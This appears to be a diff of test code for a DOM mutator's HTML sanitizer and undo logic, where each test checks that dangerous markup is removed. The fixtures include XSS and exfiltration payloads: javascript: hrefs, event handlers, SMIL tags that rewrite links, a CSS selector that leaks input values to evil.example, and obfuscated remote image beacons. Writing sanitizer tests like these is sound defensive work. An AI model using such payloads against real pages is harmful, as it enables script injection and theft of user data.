@@ -259,7 +259,10 @@ describe('createMutator structural edits', () => {
     const img = ref.querySelector('img');
     expect(img?.hasAttribute('onerror')).toBe(false);
     expect(img?.hasAttribute('onload')).toBe(false);
-    expect(img?.getAttribute('src')).toBe('x'); // resource attr preserved
+    // Behavior changed deliberately (#58 review, MAJOR-1): the sanitizer now applies setAttr's
+    // deny-list uniformly, so a remote-loading `src` is refused too — otherwise insertNode would
+    // trivially bypass setAttr('src', …)'s refusal.
+    expect(img?.getAttribute('src')).toBeNull();
   });
 
   it('moveNode relocates and undo restores the original position', () => {
@@ -300,5 +303,190 @@ describe('createMutator page ops', () => {
     expect(mutation.computed).toEqual({ width: 375, height: null });
     mutation.undo();
     expect(root.style.getPropertyValue('max-width')).toBe('');
+  });
+});
+
+describe('createMutator structural undo anchors (#58)', () => {
+  it('removeNode undo restores the SAME node object (identity, not an equal clone)', () => {
+    mount('<ul id="list"><li id="x">x</li><li id="y">y</li></ul>');
+    const x = byId('x');
+    const mutation = createMutator(document).removeNode(x);
+    mutation.undo();
+    expect(document.getElementById('x')).toBe(x);
+  });
+
+  it('moveNode undo restores the original anchor with a same-tag sibling present (an index restore would fail)', () => {
+    mount('<div id="a"><span id="one">1</span><span id="two">2</span></div><div id="b"></div>');
+    const [one, two, a, b] = [byId('one'), byId('two'), byId('a'), byId('b')];
+    const mutation = createMutator(document).moveNode(one, b, 'beforeend');
+    expect(b.contains(one)).toBe(true);
+    mutation.undo();
+    expect(a.contains(one)).toBe(true);
+    expect(one.nextSibling).toBe(two); // restored at the anchor, not "index 0"
+  });
+});
+
+describe('insertNode markup sanitizer (#58 review)', () => {
+  it('drops framed-document and document-hijack tags outright', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<p id="ok">ok</p><iframe src="https://evil.example"></iframe><object data="x"></object>' +
+        '<embed src="x"><base href="https://evil.example/"><meta http-equiv="refresh" content="0">' +
+        '<link rel="stylesheet" href="https://evil.example/x.css"><script>window.x=1</' +
+        'script>',
+      'beforeend',
+    );
+    expect(document.getElementById('ok')).not.toBeNull();
+    for (const tag of ['iframe', 'object', 'embed', 'base', 'meta', 'link', 'script'])
+      expect(document.querySelector(tag), tag).toBeNull();
+  });
+
+  it('runs every attribute through the setAttr deny-list (srcdoc/src/javascript:/marker all die)', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      `<a id="a" href="javascript:alert(1)" onclick="alert(2)" ${MARKER_ATTR}="dz-99">x</a>` +
+        '<img id="i" src="https://evil.example/x.png" alt="pic">',
+      'beforeend',
+    );
+    const a = document.getElementById('a');
+    expect(a?.getAttribute('href')).toBeNull();
+    expect(a?.getAttribute('onclick')).toBeNull();
+    expect(a?.getAttribute(MARKER_ATTR)).toBeNull();
+    // uniform with setAttr: plain remote loads are refused too — mockups are described, not hotlinked
+    expect(document.getElementById('i')?.getAttribute('src')).toBeNull();
+    expect(document.getElementById('i')?.getAttribute('alt')).toBe('pic');
+  });
+
+  it('sanitizes INSIDE nested <template> content (page JS could clone it live later)', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<template id="tpl"><span onclick="alert(1)">inner</span><iframe src="https://evil.example"></iframe></template>',
+      'beforeend',
+    );
+    const tpl = document.getElementById('tpl') as HTMLTemplateElement;
+    expect(tpl.content.querySelector('span')?.getAttribute('onclick')).toBeNull();
+    expect(tpl.content.querySelector('iframe')).toBeNull();
+  });
+});
+
+describe('structural undo under page churn (#58 review)', () => {
+  it('removeNode undo throws honestly when the anchor sibling was churned away', () => {
+    mount('<ul id="list"><li id="x">x</li><li id="y">y</li></ul>');
+    const y = byId('y');
+    const mutation = createMutator(document).removeNode(byId('x'));
+    y.remove(); // page-side churn the recorder knows nothing about (SPA re-render)
+    expect(() => mutation.undo()).toThrow(/original location changed/);
+  });
+
+  it('removeNode undo throws when the whole parent was detached (no silent invisible restore)', () => {
+    mount('<section id="wrap"><ul id="list"><li id="x">x</li></ul></section>');
+    const mutation = createMutator(document).removeNode(byId('x'));
+    byId('wrap').remove(); // the parent is now in a detached subtree
+    expect(() => mutation.undo()).toThrow(/original location changed/);
+  });
+
+  it('moveNode undo restores the anchor after a concurrent shift (the case an index restore fails)', () => {
+    mount('<div id="a"><span id="one">1</span><span id="two">2</span></div><div id="b"></div>');
+    const [one, two, a, b] = [byId('one'), byId('two'), byId('a'), byId('b')];
+    const mutation = createMutator(document).moveNode(one, b, 'beforeend');
+    // Unrecorded concurrent mutation: a NEW first child appears in the original parent. An
+    // index-based restore would put #one before the NEW node; the anchor restore puts it before #two.
+    a.insertBefore(document.createElement('span'), two);
+    mutation.undo();
+    expect(a.contains(one)).toBe(true);
+    expect(one.nextSibling).toBe(two);
+  });
+});
+
+describe('insertNode sanitizer residuals (#144 round-3 review)', () => {
+  it('drops SMIL animation tags (they can rewrite href to javascript: AFTER insertion)', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<svg id="s" viewBox="0 0 10 10"><a href="?"><animate attributeName="href" values="javascript:alert(1)"/>' +
+        '<set attributeName="href" to="javascript:alert(1)"/><circle r="2">' +
+        '<animateMotion path="M0,0 L1,1"/><animateTransform attributeName="transform"/>' +
+        '</circle></svg>',
+      'beforeend',
+    );
+    const svg = document.getElementById('s');
+    expect(svg).not.toBeNull(); // the SVG itself is legit design markup
+    for (const tag of ['animate', 'set', 'animateMotion', 'animateTransform'])
+      expect(svg?.querySelector(tag), tag).toBeNull();
+  });
+
+  it("drops <style> elements (page-wide CSS is beyond setStyle's scoped grant)", () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<p id="ok" style="color: red">ok</p><style>input[value^="a"]{background:url(//evil/a)}</style>',
+      'beforeend',
+    );
+    expect(document.getElementById('ok')).not.toBeNull();
+    expect(document.getElementById('ok')?.getAttribute('style')).toBe('color: red'); // inline style stays
+    expect(document.querySelector('style')).toBeNull();
+  });
+
+  it('refuses remote http(s) href on SVG image/use, keeps data: and fragment refs', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<svg><image id="img" href="https://evil.example/beacon.png"/>' +
+        '<image id="img2" href="data:image/png;base64,AAA"/>' +
+        '<use id="u" href="#local-shape"/></svg>',
+      'beforeend',
+    );
+    expect(document.getElementById('img')?.getAttribute('href')).toBeNull();
+    expect(document.getElementById('img2')?.getAttribute('href')).toBe('data:image/png;base64,AAA');
+    expect(document.getElementById('u')?.getAttribute('href')).toBe('#local-shape');
+  });
+});
+
+describe('insertNode SVG href allowlist (#144 round-4 review)', () => {
+  it('refuses protocol-relative, C0-obfuscated, tab-obfuscated, and feImage remote loads', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<svg><image id="a" href="//evil.example/beacon.png"/>' +
+        '<image id="b" href="\x0Ehttps://evil.example/x"/>' +
+        '<image id="c" href="h\ttps://evil.example/x"/>' +
+        '<filter id="f"><feImage href="https://evil.example/y"/></filter></svg>',
+      'beforeend',
+    );
+    expect(document.getElementById('a')?.getAttribute('href')).toBeNull();
+    expect(document.getElementById('b')?.getAttribute('href')).toBeNull();
+    expect(document.getElementById('c')?.getAttribute('href')).toBeNull();
+    expect(document.querySelector('feImage')?.getAttribute('href')).toBeNull();
+  });
+
+  it('keeps same-document fragment refs and inline data:image/ on image/use', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<svg><use id="u" href="#shape"/><image id="i" href="data:image/png;base64,AAA"/></svg>',
+      'beforeend',
+    );
+    expect(document.getElementById('u')?.getAttribute('href')).toBe('#shape');
+    expect(document.getElementById('i')?.getAttribute('href')).toBe('data:image/png;base64,AAA');
+  });
+});
+
+describe('legacy presentational background attribute (#144 round-4 review)', () => {
+  it('attrDenyReason refuses background (an automatic remote load on table/body family)', () => {
+    expect(attrDenyReason('background', 'https://evil.example/x')).toContain('remote resource');
+  });
+
+  it('insertNode strips the background attribute from inserted markup', () => {
+    mount('<div id="host"></div>');
+    createMutator(document).insertNode(
+      byId('host'),
+      '<table id="t" background="https://evil.example/x"><tr><td>cell</td></tr></table>',
+      'beforeend',
+    );
+    expect(document.getElementById('t')?.getAttribute('background')).toBeNull();
+    expect(document.getElementById('t')?.textContent).toContain('cell');
   });
 });
